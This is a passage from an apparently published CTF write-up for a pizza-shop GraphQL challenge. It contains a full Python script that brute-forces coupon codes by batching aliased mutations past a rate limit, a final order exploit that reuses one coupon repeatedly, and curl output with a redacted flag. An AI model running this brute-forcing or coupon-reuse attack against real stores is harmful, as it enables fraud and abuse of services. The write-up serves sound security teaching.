+<span class="s2">    b1: validateBasket(input: { pizzas: [], couponCodes: [\&quot;00006\&quot;,\&quot;00007\&quot;,\&quot;00008\&quot;,\&quot;00009\&quot;,\&quot;00010\&quot;,\&quot;00011\&quot;] }) {</span>
+<span class="s2">      appliedCoupons { code description discountType isValid }</span>
+<span class="s2">    }</span>
+<span class="s2">    b2: validateBasket(input: { pizzas: [], couponCodes: [\&quot;00012\&quot;,\&quot;00013\&quot;,\&quot;00014\&quot;,\&quot;00015\&quot;,\&quot;00016\&quot;,\&quot;00017\&quot;] }) {</span>
+<span class="s2">      appliedCoupons { code description discountType isValid }</span>
+<span class="s2">    }</span>
+<span class="s2">    b3: validateBasket(input: { pizzas: [], couponCodes: [\&quot;00018\&quot;,\&quot;00019\&quot;,\&quot;00020\&quot;,\&quot;00021\&quot;,\&quot;00022\&quot;,\&quot;00023\&quot;] }) {</span>
+<span class="s2">      appliedCoupons { code description discountType isValid }</span>
+<span class="s2">    }</span>
+<span class="s2">    b4: validateBasket(input: { pizzas: [], couponCodes: [\&quot;00024\&quot;,\&quot;00025\&quot;,\&quot;00026\&quot;,\&quot;00027\&quot;,\&quot;00028\&quot;,\&quot;00029\&quot;] }) {</span>
+<span class="s2">      appliedCoupons { code description discountType isValid }</span>
+<span class="s2">    }</span>
+<span class="s2">  }&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Scaling this structure gives access to hundreds of coupon checks per request while remaining inside the rate limit.</p>
+<h2 id="8-full-python-brute-forcer">8. Full Python Brute Forcer<a class="headerlink" href="#8-full-python-brute-forcer" title="Permanent link">&para;</a></h2>
+<p>Below is the full brute forcing script that uses GraphQL aliasing to test thousands of codes per minute. It outputs any valid coupons and stops upon finding a strong enough discount.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">csv</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s2">&quot;http://9cdc02c2ab20.challs.tudc.tf:30155/graphql&quot;</span> <span class="c1"># Or input wherever you&#39;re running the app. localhost:3000/graphql</span>
+
+<span class="n">CODES_PER_BASKET</span> <span class="o">=</span> <span class="mi">6</span>
+<span class="n">BASKETS_PER_REQUEST</span> <span class="o">=</span> <span class="mi">50</span>
+<span class="n">RATE_LIMIT_DELAY</span> <span class="o">=</span> <span class="mf">1.6</span>
+
+<span class="n">CSV_FILENAME</span> <span class="o">=</span> <span class="s2">&quot;coupons_fast.csv&quot;</span>
+
+
+<span class="k">def</span> <span class="nf">build_query</span><span class="p">(</span><span class="n">code_groups</span><span class="p">):</span>
+    <span class="n">parts</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;mutation {&quot;</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">group</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">code_groups</span><span class="p">):</span>
+        <span class="n">alias</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;b</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&quot;</span>
+        <span class="n">codes_list</span> <span class="o">=</span> <span class="s2">&quot;, &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&quot;</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s1">&quot;&#39;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">group</span><span class="p">)</span>
+        <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span>
+            <span class="sa">f</span><span class="s2">&quot;&quot;&quot;  </span><span class="si">{</span><span class="n">alias</span><span class="si">}</span><span class="s2">: validateBasket(input: </span><span class="se">{{</span>
+<span class="s2">    pizzas: [],</span>
+<span class="s2">    couponCodes: [</span><span class="si">{</span><span class="n">codes_list</span><span class="si">}</span><span class="s2">]</span>
+<span class="s2">  </span><span class="se">}}</span><span class="s2">) </span><span class="se">{{</span>
+<span class="s2">    appliedCoupons </span><span class="se">{{</span>
+<span class="s2">      code</span>
+<span class="s2">      description</span>
+<span class="s2">      discountType</span>
+<span class="s2">      isValid</span>
+<span class="s2">    </span><span class="se">}}</span>
+<span class="s2">  </span><span class="se">}}</span><span class="s2">&quot;&quot;&quot;</span>
+        <span class="p">)</span>
+
+    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;}&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">send_mutation</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;query&quot;</span><span class="p">:</span> <span class="n">query</span><span class="p">}</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">429</span><span class="p">:</span>
+            <span class="n">retry</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;Retry-After&quot;</span><span class="p">,</span> <span class="s2">&quot;5&quot;</span><span class="p">)</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">retry</span><span class="p">))</span>
+            <span class="k">continue</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+            <span class="k">continue</span>
+
+        <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+        <span class="k">if</span> <span class="s2">&quot;errors&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+            <span class="k">continue</span>
+
+        <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">is_interesting_coupon</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;isValid&quot;</span><span class="p">):</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="n">dtype</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;discountType&quot;</span><span class="p">)</span>
+    <span class="n">desc</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;description&quot;</span><span class="p">)</span> <span class="ow">or</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="k">if</span> <span class="n">dtype</span> <span class="o">==</span> <span class="s2">&quot;Percentage&quot;</span> <span class="ow">and</span> <span class="s2">&quot;100&quot;</span> <span class="ow">in</span> <span class="n">desc</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">True</span>
+
+    <span class="k">if</span> <span class="n">dtype</span> <span class="o">==</span> <span class="s2">&quot;Threshold&quot;</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(\d+)%&quot;</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+            <span class="n">pct</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+            <span class="k">if</span> <span class="n">pct</span> <span class="o">&gt;=</span> <span class="mi">20</span><span class="p">:</span>
+                <span class="k">return</span> <span class="kc">True</span>
+
+    <span class="k">return</span> <span class="kc">False</span>
+
+
+<span class="k">def</span> <span class="nf">brute_force</span><span class="p">(</span><span class="n">start</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">CSV_FILENAME</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">writer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">writer</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+        <span class="n">writer</span><span class="o">.</span><span class="n">writerow</span><span class="p">([</span><span class="s2">&quot;code&quot;</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">])</span>
+
+        <span class="n">current</span> <span class="o">=</span> <span class="n">start</span>
+        <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">:</span>
+            <span class="n">code_groups</span> <span class="o">=</span> <span class="p">[]</span>
+            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">BASKETS_PER_REQUEST</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">current</span> <span class="o">&gt;=</span> <span class="n">end</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="n">group</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="s2">05d</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="nb">min</span><span class="p">(</span><span class="n">current</span> <span class="o">+</span> <span class="n">CODES_PER_BASKET</span><span class="p">,</span> <span class="n">end</span><span class="p">))]</span>
+                <span class="n">code_groups</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">group</span><span class="p">)</span>
+                <span class="n">current</span> <span class="o">+=</span> <span class="n">CODES_PER_BASKET</span>
+
+            <span class="n">query</span> <span class="o">=</span> <span class="n">build_query</span><span class="p">(</span><span class="n">code_groups</span><span class="p">)</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">send_mutation</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+
+            <span class="k">for</span> <span class="n">alias</span><span class="p">,</span> <span class="n">basket</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+                <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">basket</span><span class="p">[</span><span class="s2">&quot;appliedCoupons&quot;</span><span class="p">]:</span>
+                    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;isValid&quot;</span><span class="p">):</span>
+                        <span class="n">writer</span><span class="o">.</span><span class="n">writerow</span><span class="p">([</span>
+                            <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;code&quot;</span><span class="p">),</span>
+                            <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;discountType&quot;</span><span class="p">),</span>
+                            <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;description&quot;</span><span class="p">)</span>
+                        <span class="p">])</span>
+                        <span class="k">if</span> <span class="n">is_interesting_coupon</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+                            <span class="k">return</span> <span class="n">c</span>
+
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">RATE_LIMIT_DELAY</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="kc">None</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">coupon</span> <span class="o">=</span> <span class="n">brute_force</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Found coupon:&quot;</span><span class="p">,</span> <span class="n">coupon</span><span class="p">)</span>
+</code></pre></div>
+<p>The script finds a Threshold coupon with a sufficiently high discount.</p>
+<hr />
+<h2 id="9-final-exploit">9. Final Exploit<a class="headerlink" href="#9-final-exploit" title="Permanent link">&para;</a></h2>
+<p>Once a good coupon has been found, the remaining step is to reuse the same coupon multiple times in an order. The backend does not check whether a coupon is applied more than once.</p>
+<p>Here is the mutation that actually produces the flag:</p>
+<div class="highlight"><pre><span></span><code><span class="k">mutation</span><span class="w"> </span><span class="nf">Order</span><span class="p">(</span><span class="nv">$input</span><span class="p">:</span><span class="w"> </span><span class="nc">ValidateBasketInput</span><span class="p">!)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">order</span><span class="p">(</span><span class="n">input</span><span class="p">:</span><span class="w"> </span><span class="nv">$input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">success</span>
+<span class="w">    </span><span class="n">message</span>
+<span class="w">    </span><span class="n">flag</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Variables:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;input&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;pizzas&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;FLAG&quot;</span><span class="p">],</span>
+<span class="w">    </span><span class="nt">&quot;couponCodes&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">      </span><span class="s2">&quot;18493&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;18493&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;18493&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;18493&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;18493&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;18493&quot;</span>
+<span class="w">    </span><span class="p">]</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>This brought the total price below the required 500 euro limit, and the backend returned:</p>
+<h2 id="kalikali-curl-x-post-httplocalhost3000graphql-h-content-type-applicationjson-data-exploitjson-dataordersuccesstruemessageorder-placed-successfully-total-23796flagtudctfredacted"><div class="highlight"><pre><span></span><code>┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://localhost:3000/graphql \
+  -H &quot;Content-Type: application/json&quot; \
+  --data @exploit.json
+
+{&quot;data&quot;:{&quot;order&quot;:{&quot;success&quot;:true,&quot;message&quot;:&quot;Order placed successfully! Total: €237.96&quot;,&quot;flag&quot;:&quot;TUDCTF{redacted}&quot;}}}
+</code></pre></div><a class="headerlink" href="#kalikali-curl-x-post-httplocalhost3000graphql-h-content-type-applicationjson-data-exploitjson-dataordersuccesstruemessageorder-placed-successfully-total-23796flagtudctfredacted" title="Permanent link">&para;</a></h2>
+<h2 id="10-closing-remarks">10. Closing Remarks<a class="headerlink" href="#10-closing-remarks" title="Permanent link">&para;</a></h2>
+<p>The core problem in this challenge is the interaction between a rate-limited HTTP proxy and an unbounded GraphQL backend. As soon as the system allows multiple GraphQL operations in one HTTP request, the effective brute force rate grows by orders of magnitude. The remaining mistake is permitting a coupon to be applied repeatedly in a single order without further checks.</p>
+<p>GraphQL aliasing continues to be an underrated attack surface. This challenge illustrates how even a simple rate-limit can be bypassed outright via batching.</p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../nothing/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Nothing" rel="prev">
+            <div class="md-footer__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Nothing
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../signs/" class="md-footer__link md-footer__link--next" aria-label="Next: Signs" rel="next">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Signs
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.top", "navigation.footer", "navigation.instant", "content.code.copy", "content.code.select"], "search": "../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.220ee61c.min.js"></script>
+      
+        
+          <script src="../js/particles.min.js"></script>
+        
+      
+        
+          <script src="../js/particles-init.js"></script>
+        
+      
+    
+  </body>
+</html>
